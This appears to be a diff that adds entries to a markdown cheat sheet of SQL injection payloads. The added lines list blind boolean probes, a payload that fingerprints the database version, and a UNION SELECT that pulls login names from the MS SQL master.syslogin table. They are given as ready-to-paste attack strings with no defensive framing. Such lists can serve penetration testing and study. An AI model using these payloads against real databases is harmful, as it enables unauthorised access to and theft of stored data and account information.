@@ -28,5 +28,31 @@ __Basic Payloads___
                     proxy, or through any other means.
     
     
-- 
 
+
+### Blind SQL : 
+
+This type of SQL injection is based on booleans : True or False .
+
+
+- ' and 'a'='a
+
+- ' and 'a'='b
+
+- ' and substring(@@version,1,1)='5   &nbsp; |  &nbsp; find the version of the db
+
+
+
+Automate the process of SQL blind
+>> script 
+
+
+### Band SQL:
+
+- ' and 'a'='a
+
+- ' and 'a'='b
+
+- 9999' UNION SELECT name,222,'else1' FROM master.syslogin; --
+
+### 
